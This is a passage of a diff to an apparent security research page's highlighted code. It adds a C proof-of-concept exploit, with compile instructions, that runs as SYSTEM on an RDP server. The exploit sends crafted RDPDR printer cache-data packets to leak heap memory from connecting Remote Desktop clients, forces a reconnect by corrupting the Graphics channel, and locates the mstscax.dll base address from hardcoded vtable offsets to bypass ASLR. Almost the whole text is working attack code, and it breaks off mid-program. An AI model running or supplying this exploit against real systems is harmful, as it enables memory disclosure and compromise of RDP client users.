-                            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> k <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; k <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">sizeof</span>(vtable_offsets) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(vtable_offsets[<span style="color:#ae81ff">0</span>]); k<span style="color:#f92672">++</span>)
-                            {
-                                <span style="color:#66d9ef">if</span> (((<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(leak <span style="color:#f92672">+</span> j))) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFF</span>) <span style="color:#f92672">==</span> (vtable_offsets[k] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFF</span>))
-                                {
-                                    printf(<span style="color:#e6db74">&#34;[+] -&gt; Potential base address for mstscax.dll: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">*</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)(leak <span style="color:#f92672">+</span> j)) <span style="color:#f92672">-</span> vtable_offsets[k]);
-                                }
-                            }
-                            <span style="color:#75715e">// hexdump((char *)leak, 256);
-</span><span style="color:#75715e"></span>                        }
-                    }
-                }
-            }
-            free(buffer);
-        }
-    }
-
-    close_rdp();
-    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-}
-</code></pre></div> </div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Compilation: clang poc.c -o poc.exe -l wsock32 -l wtsapi32 -l advapi32
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Run as SYSTEM.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define _CRT_SECURE_NO_WARNINGS
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;io.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winsock2.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winsvc.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;wtsapi32.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_VC_WRITE_TRIES 20
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define STATIC_CHANNEL 0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define DYNAMIC_CHANNEL 1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> vtable_offsets[] <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 10.0.19041.844
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x5c88e0</span>, <span style="color:#75715e">// const CTSMsg::`vftable`
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x5c92d8</span>, <span style="color:#75715e">// const CMemory::`vftable`{for `CImplIUknown&lt;struct IUnknown&gt;`}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// 10.0.21354.1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x62c048</span>, <span style="color:#75715e">// const CFileRedirector::`vftable&#39;{for `INonDelegatingUnknown&#39;}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x62c1b8</span>, <span style="color:#75715e">// const CTSSyncWaitResult::`vftable&#39;{for `INonDelegatingUnknown&#39;}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x62c238</span>, <span style="color:#75715e">// const CTSMsg::`vftable&#39;{for `CTSObject&#39;}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x62dc20</span>, <span style="color:#75715e">// const CTSPooledUnknown::`vftable&#39;{for `INonDelegatingUnknown&#39;}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x62de48</span>  <span style="color:#75715e">// const CMemory::`vftable&#39;{for `CImplIUnknown&lt;struct IUnknown&gt;&#39;}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HANDLE rdp_server;
+</span></span><span style="display:flex;"><span>HANDLE virtual_channel;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hexdump</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buffer, <span style="color:#66d9ef">int</span> length)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> length; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;%02x &#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>)buffer[i]);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hook_to_rdp</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    rdp_server <span style="color:#f92672">=</span> WTSOpenServerA(<span style="color:#e6db74">&#34;localhost&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>rdp_server)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[x] Could not open RDP server handle. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Hooked to local RDP server.</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">connect_to_virtual_channel</span>(<span style="color:#66d9ef">char</span> channel_name[], <span style="color:#66d9ef">int</span> n_tries, <span style="color:#66d9ef">int</span> channel_type)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Attempting to open Virtual Channel...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> tries <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        tries<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (tries <span style="color:#f92672">&gt;=</span> n_tries)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        virtual_channel <span style="color:#f92672">=</span> WTSVirtualChannelOpenEx(WTS_CURRENT_SESSION, channel_name, channel_type <span style="color:#f92672">==</span> DYNAMIC_CHANNEL <span style="color:#f92672">?</span> WTS_CHANNEL_OPTION_DYNAMIC : <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (virtual_channel)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        Sleep(<span style="color:#ae81ff">1000</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (tries <span style="color:#f92672">==</span> n_tries)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[x] Couldn&#39;t open Virtual Channel &#39;%s&#39; in %d tries. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, channel_name, tries, GetLastError());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Opened Virtual Channel &#39;%s&#39; in %d tries.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, channel_name, tries);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">write_to_virtual_channel</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buffer, <span style="color:#66d9ef">int</span> length)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> bytes_written;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> tries <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        tries<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (tries <span style="color:#f92672">&gt;=</span> MAX_VC_WRITE_TRIES)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (WTSVirtualChannelWrite(virtual_channel, buffer, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)length, <span style="color:#f92672">&amp;</span>bytes_written))
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        Sleep(<span style="color:#ae81ff">500</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (tries <span style="color:#f92672">==</span> MAX_VC_WRITE_TRIES)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[x] Could not write to Virtual Channel. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Successfully wrote %lu bytes to Virtual Channel.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, bytes_written);
+</span></span><span style="display:flex;"><span>    hexdump(buffer, length);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">close_virtual_channel</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Closing Virtual Channel.</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    WTSVirtualChannelClose(virtual_channel);
+</span></span><span style="display:flex;"><span>    CloseHandle(virtual_channel);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">close_rdp</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Closing RDP handle.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    WTSCloseServer(rdp_server);
+</span></span><span style="display:flex;"><span>    CloseHandle(rdp_server);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">get_termservice_pid</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    DWORD bytesNeeded, servicesNum, lastError, pid;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> serviceName[<span style="color:#ae81ff">256</span>];
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    SC_HANDLE manager <span style="color:#f92672">=</span> OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (manager <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[x] Could not open manager. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    BOOL status <span style="color:#f92672">=</span> EnumServicesStatusEx(manager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>bytesNeeded, <span style="color:#f92672">&amp;</span>servicesNum, NULL, NULL);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>status <span style="color:#f92672">&amp;&amp;</span> (lastError <span style="color:#f92672">=</span> GetLastError()) <span style="color:#f92672">!=</span> ERROR_MORE_DATA)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[x] Could not enumerate services. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lastError);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    PBYTE lpBytes <span style="color:#f92672">=</span> (PBYTE)malloc(bytesNeeded);
+</span></span><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> EnumServicesStatusEx(manager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, lpBytes, bytesNeeded, <span style="color:#f92672">&amp;</span>bytesNeeded, <span style="color:#f92672">&amp;</span>servicesNum, NULL, NULL);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>status)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[x] Could not enumerate services. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
+</span></span><span style="display:flex;"><span>        free(lpBytes);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ENUM_SERVICE_STATUS_PROCESS <span style="color:#f92672">*</span>lpServiceStatus <span style="color:#f92672">=</span> (ENUM_SERVICE_STATUS_PROCESS <span style="color:#f92672">*</span>)lpBytes;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> servicesNum; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>strcmp((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)lpServiceStatus[i].lpServiceName, <span style="color:#e6db74">&#34;TermService&#34;</span>))
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            pid <span style="color:#f92672">=</span> lpServiceStatus[i].ServiceStatusProcess.dwProcessId;
+</span></span><span style="display:flex;"><span>            printf(<span style="color:#e6db74">&#34;[+] Found TermService (PID %lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pid);
+</span></span><span style="display:flex;"><span>            free(lpBytes);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> pid;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[x] Could not find TermService.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    free(lpBytes);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[])
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    DWORD svchostPid;
+</span></span><span style="display:flex;"><span>    HANDLE hProcess;
+</span></span><span style="display:flex;"><span>    MEMORY_BASIC_INFORMATION info;
+</span></span><span style="display:flex;"><span>    SIZE_T bytesRead;
+</span></span><span style="display:flex;"><span>    LPVOID buffer;
+</span></span><span style="display:flex;"><span>    BYTE <span style="color:#f92672">*</span>leak;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> leak_heap[] <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// DR_PRN_ADD_CACHEDATA
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x50</span>,                         <span style="color:#75715e">// Header
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,                         <span style="color:#75715e">// EventId
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x4f</span>, <span style="color:#ae81ff">0x4d</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x3a</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// PortDosName
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,                         <span style="color:#75715e">// PnpNameLen
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0x2a</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,                         <span style="color:#75715e">// DriverNameLen
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0x2a</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,                         <span style="color:#75715e">// PrintNameLen
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,                         <span style="color:#75715e">// CachedFieldsLen
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// DriverName
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x50</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x55</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// PrinterName
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x2d</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x55</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0x64</span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    hook_to_rdp();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Connect to RDPDR channel
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>connect_to_virtual_channel(<span style="color:#e6db74">&#34;rdpdr&#34;</span>, <span style="color:#ae81ff">10</span>, STATIC_CHANNEL))
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Add Printer Cachedata to client registry, several times to increase probability of success
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> k <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; k <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; k<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        write_to_virtual_channel(leak_heap, <span style="color:#66d9ef">sizeof</span>(leak_heap));
+</span></span><span style="display:flex;"><span>        Sleep(<span style="color:#ae81ff">200</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Close RDPDR channel
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    close_virtual_channel();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Trick the client into reconnecting by corrupting the Graphics channel
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Sometimes it reconnects automatically, sometimes it requires manual action...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>connect_to_virtual_channel(<span style="color:#e6db74">&#34;Microsoft::Windows::RDS::Graphics&#34;</span>, <span style="color:#ae81ff">10</span>, DYNAMIC_CHANNEL))
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    write_to_virtual_channel(<span style="color:#e6db74">&#34;fuzzed up beyond all repair&#34;</span>, <span style="color:#ae81ff">27</span>);
+</span></span><span style="display:flex;"><span>    close_virtual_channel();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Wait for the client to reconnect
